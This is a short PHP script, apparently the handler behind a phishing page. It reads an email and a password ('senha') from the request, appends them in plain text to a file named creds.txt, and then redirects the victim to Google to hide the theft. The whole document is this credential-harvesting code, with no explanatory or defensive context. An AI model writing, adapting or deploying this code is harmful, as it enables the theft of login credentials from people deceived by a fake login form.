<?php 
if (isset($_GET['email']) && isset($_GET['senha'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Email: {$_GET['email']} | Senha: {$_GET['senha']}\n");
    header("Location: https://www.google.com");
    fclose($file);
    exit();
}
?>